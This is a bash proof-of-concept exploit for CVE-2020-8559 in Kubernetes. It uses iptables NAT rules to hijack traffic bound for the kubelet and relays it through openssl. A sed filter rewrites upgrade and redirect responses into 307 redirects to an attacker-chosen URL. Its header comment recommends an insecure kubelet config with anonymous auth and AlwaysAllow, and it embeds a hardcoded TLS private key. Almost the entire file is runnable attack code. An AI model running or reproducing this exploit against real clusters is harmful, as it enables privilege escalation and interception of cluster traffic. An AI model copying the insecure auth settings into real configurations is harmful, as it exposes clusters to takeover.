#! /bin/bash

# POC-2020-8559
# Simple exploit for CVE-2020-8559. We steal
# all the connections to the kubelet using iptables
# then rewrite the 101 or 302 responses to 307.
#
# We don't have access to the kube-apiserver's
# x509 cert, so kubelet webhook auth can be a
# problem. No problem with this config fragment:
#authentication:
#  anonymous:
#    enabled: true
#authorization:
#  mode: AlwaysAllow

########################################
# Parse options

# defaults
outputchain="no"
targeturl="http://127.0.0.1:8080/honk"
kubelethostport="127.0.0.1:10250"
honkhostport="0.0.0.0:20250"
certfile=""
privkeyfile=""

ishostport() {
	echo "${1}" | grep "^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\:[0-9][0-9]*$" >> /dev/null
	exit $?
}

usage() {
	cat <<-EOF
	Usage: $0 [-o] [-t targeturl] [-k kubelethostport] [-h honkhostport] [-c certfile] [-p privatekeyfile]
	  -o		Redirect OUTPUT chain, in addition to PREROUTING.
	 		Needed for testing on single-node clusters.

	Defaults:
	targeturl: ${targeturl}
	kubelethostport: ${kubelethostport}
	honkhostport: ${honkhostport}
	certfile: (hardcoded tempfile)
	privatekeyfile: (hardcoded tempfile)
	
	EOF
}

while getopts ":t:k:h:c:p:o" opt; do
	case "${opt}" in
		o )
			outputchain="yes"
			;;
		t )
			targeturl="${OPTARG}"
			;;
		k )
			if `ishostport "${OPTARG}"` ; then
				kubelethostport="${OPTARG}"
			else
				usage
				echo
				echo "-k requires an argument of the form X.X.X.X:YYY"
				exit 1
			fi
			;;
		h )
			if `ishostport "${OPTARG}"` ; then
				honkhostport="${OPTARG}"
			else
				usage
				echo
				echo "-k requires an argument of the form X.X.X.X:YYY"
				exit 1
			fi
			;;
		c )
			if [ -r "${OPTARG}" ]; then
				certfile="${OPTARG}"
			else
				usage
				echo
				echo "-c requires a cert file"
				exit 1
			fi
			;;
		p )
			if [ -r "${OPTARG}" ]; then
				privkeyfile="${OPTARG}"
			else
				usage
				echo
				echo "-p requires a private key file"
				exit 1
			fi
			;;
		: )
			usage
			exit 1
			;;
		\? )
			usage
			exit 1
			;;
	esac
	shift $((OPTIND -1))
done

kubeletport=`echo "${kubelethostport}" | sed 's/^[0-9\.]*://'`
honkport=`echo "${honkhostport}" | sed 's/^[0-9\.]*://'`

# OpenSSL < 1.1 -accept requires only the port number
openssl s_server --help 2>&1 | grep 'port to accept on (default is 4433)' > /dev/null
if [ $? -eq 0 ]; then
	honkhostport="${honkport}"
fi

########################################
# Set up our firewall rules

if [ x"${outputchain}" == "xyes" ]; then
	iptables -t nat -I OUTPUT 1 -p tcp --dport "${kubeletport}" \! -d 127.0.0.1 -j REDIRECT --to-port "${honkport}"
	if [ $? -ne 0 ]; then
		echo "Couldn't set OUTPUT iptables rule"
		exit 255
	fi
fi

iptables -t nat -I PREROUTING 1 -p tcp --dport "${kubeletport}" \! -d 127.0.0.1 -j REDIRECT --to-port "${honkport}"
if [ $? -ne 0 ]; then
	if [ x"${outputchain}" == "xyes" ]; then
		iptables -t nat -D OUTPUT -p tcp --dport "${kubeletport}" \! -d 127.0.0.1 -j REDIRECT --to-port "${honkport}"
	fi
	echo "Couldn't set PREROUTING iptables rule"
	exit 255
fi

########################################
# Prep some work files

cleanup() {
	if [ x"${outputchain}" == "xyes" ]; then
		iptables -t nat -D OUTPUT -p tcp --dport "${kubeletport}" \! -d 127.0.0.1 -j REDIRECT --to-port "${honkport}"
	fi
	iptables -t nat -D PREROUTING -p tcp --dport "${kubeletport}" \! -d 127.0.0.1 -j REDIRECT --to-port "${honkport}"
	rm -r "${workdir}"
	exit 1
}

trap cleanup INT

workdir=`mktemp -d`
fifo="${workdir}/fifo"
mkfifo "${fifo}"

if [ -z "${certfile}" ]; then
	certfile="${workdir}/cert.pem"
	cat <<-EOF > "${certfile}"
	-----BEGIN CERTIFICATE-----
	MIIDETCCAfkCFDGJub2NUVs9GXPCEmlLlLIg2LNOMA0GCSqGSIb3DQEBCwUAMEUx
	CzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRl
	cm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwNzE3MjE0MzQxWhcNMzAwNzE1MjE0
	MzQxWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UE
	CgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOC
	AQ8AMIIBCgKCAQEArBTx9aIRlB/crQrW12+C0Y2DW/XEUgjIyW2Oun/JxcOM07tV
	slFUTmpsGbsaArnkhGrzEh3m4cuF3jpvSCdDTPt1pIstNnjKYCBXmKlQjJCDaVXc
	SY9P85ZMJfrfmJFrKljaOigCj8eJTae0mwFH6A/oER0MmPo6PnyNtrC31LV581ro
	jBLyoZZdTSpyOIFzoEqndKAb+HsD7s7JCv+8HiYNa+qaDB4QR7x4wqq/Pgoa30/Y
	s/sFJf9jPGGH/J76jUds724wuIOEe7KQ5hVff+/zbjtEWknrza50rTGU7wcr/3gh
	zJqCKzD4Xx/nJduBWujKD4uVQqvQOIGiprSK1QIDAQABMA0GCSqGSIb3DQEBCwUA
	A4IBAQAFscLn8zbFTuEPDQIV42o/K4tgq+Tlt3yLTXvvfi1oG5gJTLeWS7IxOzd7
	PJVodJwOYA5bTq4Ng3xKUpjAcVeX1ZcMVTSKJtyiBP5IKIwMgB6H9vIvzSL0W2qr
	9ONDQqr22C6INOQ+0xtqFtuMs4jeS14ptQRiQwVQ/HtVB4+ONsdN21oerB9lthor
	yU1r7vn1EiyHACWPEHJQH/ImjQC9M57XtXROMWYQuo+Olbo6B3RwpPjMGeQ5NLV8
	bVLjaPB+gNMy/h7x61PY/bJrEwOnqOEIOkHUMSn+YqwZMT4oELRoexTDFz3BtAxk
	P+hBfSAW9yrUS6VDy9srW9PkIhqy
	-----END CERTIFICATE-----
	-----BEGIN PRIVATE KEY-----
	MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCsFPH1ohGUH9yt
	CtbXb4LRjYNb9cRSCMjJbY66f8nFw4zTu1WyUVROamwZuxoCueSEavMSHebhy4Xe
	Om9IJ0NM+3Wkiy02eMpgIFeYqVCMkINpVdxJj0/zlkwl+t+YkWsqWNo6KAKPx4lN
	p7SbAUfoD+gRHQyY+jo+fI22sLfUtXnzWuiMEvKhll1NKnI4gXOgSqd0oBv4ewPu
	zskK/7weJg1r6poMHhBHvHjCqr8+ChrfT9iz+wUl/2M8YYf8nvqNR2zvbjC4g4R7
	spDmFV9/7/NuO0RaSevNrnStMZTvByv/eCHMmoIrMPhfH+cl24Fa6MoPi5VCq9A4
	gaKmtIrVAgMBAAECggEAOEz6BQWrfq0WBD+hnwbK5EjKi5HTU4uwNcb0haw9lciv
	EK8gEKFvVeCX0atXjUDItVJQiMLjwUhXWigANLkz2cID8XvfpQzMGbs7LaVnxzWY
	6SPAWQjcfbPU4jA8a6xYRZigfZqNjAEauR9/hZ9bqV9a7A53Cq4D1GHn87fJzXux
	MzdDF6JumWtcqM+rmiPKhbSf+6Blxypee7p3oOa232MjZCRXRFUhdNIepoVvTmh6
	jigMlMtIlS0F1Ak3uA2SCQhqHdhWd6lkeFZigR9fIl+GyG4rcBaWwkZN5xwrWONI
	gl/L9eu6Ndt7yEvUf4vI2nW4ryZOyj/pMwajJYQOGQKBgQDW7ZJUbxVbyG9gTUql
	cYf8KwUH/PZ1NPY9ciZuLia9loep1pAnpx9wA+ZD6ZEjzbWJxbWEUbjl17kgtU+Y
	F8d0uujvHOgSIrAktMgBGom4SOLNmWXnau5G92r32S3q/R5b3zowo8nfrPfUrB2H
	CQZQ53YGCgSAbdIzTXCoIS/nRwKBgQDM907FdYmJnxSf96Hav5RVdhgRE+Ty0lJM
	+AB/Z3UdHeKZpxMChCzPL8KVsOlmGKznvz1o+xTbORlbRt9dmY/WvQQ3sEDF4Irz
	D+DbZl/VU8Tm43Wi3yTtrffWvLtnBm/yqH0ANMgh6boutbZQN5K7IjUM41JuJ12G
	DjF/tpkDAwKBgDlicQFuL0u0NliGCnol1+LyMYOyfLNKkrxRMAWW+O0BtfMYwKB1
	tKUZxW84e3INyHyidxZ/I1jqwhkDj97R6oU2Kl89XpEJBfKm+gehaEf13eh7HoQt
	PrVf9gV6zRHCx0pMTaMS+CFqczkrQy78r90GD7MJFa6co9TixkN9qOadAoGAS86g
	LLn3H5Zdu3iMPWqkAyPFbPONtx2A4QTMslJiZ115RNkdV83pAMwqTND80g0ITkJW
	BTDwGtC4hyDkVisInySTncErg8QzwAg8YwkvIqhz5+1ywcWEVAAG7T4qlcU0vGwC
	p4PeDWTzvnjosCyNsXbKZjThdOpMVduEBTdUyl8CgYEAsENT/xtl9AcWMpYul65g
	1lEG1judUdl+gfiU7NOlttv1ExF0Yu+0LG30VYwDxCsmsJZSv2fdMasrUlLEV7DI
	DwHzdZHFICyE9ab3oZ3la5BXuXEOVzJ9psTEt8ERbnI/Vd7CM4T2ngeTgxzxeuzF
	6VgR/gjAITdpN96t/kLOVjE=
	-----END PRIVATE KEY-----
	EOF
fi

if [ -z "${privkeyfile}" ]; then
	privkeyfile="${certfile}"
fi

########################################
# Loop forever, ferrying one TLS connection
# to the kubelet per invocation.

while true; do
	openssl s_server -accept "${honkhostport}" -cert "${certfile}" -key "${privkeyfile}" -quiet -no_ign_eof -naccept 1 <"${fifo}" | \
	openssl s_client -connect "${kubelethostport}" -quiet -no_ign_eof | \
	sed -u -e 's/^Location.*$/X-Honk: Honk\r/' -e 's| [13]0[12] [SF][wo][iu][tn][cd].*$| 307 Temporary Redirect\r\nLocation: '"${targeturl}"'\r|' -e 's/^Connection.*$/X-Honk: Honk\r/' >> "${fifo}"
done
